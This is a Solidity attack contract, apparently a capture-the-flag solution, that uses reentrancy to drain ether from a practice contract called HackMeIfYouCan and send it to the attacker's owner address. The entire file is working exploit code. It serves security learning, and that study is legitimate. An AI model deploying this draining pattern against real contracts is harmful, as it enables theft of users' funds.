// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "../src/HackMeIfYouCan.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ReentranceAttack {
    HackMeIfYouCan public hackMeContract;
    address payable public owner;

    constructor(address payable _hackMeContract) public payable {
        hackMeContract = HackMeIfYouCan(_hackMeContract);
        owner = msg.sender;
        hackMeContract.contribute{value: 0.0009 ether}();
    }

    function attack() external {
        address(hackMeContract).call{value: 0.0009 ether}("");
    }

    receive() external payable {
        if (address(hackMeContract).balance >= 0.0009 ether) {
            address(hackMeContract).call{value: 0.0009 ether}("");
        } else {
            owner.transfer(address(this).balance);
        }
    }
}
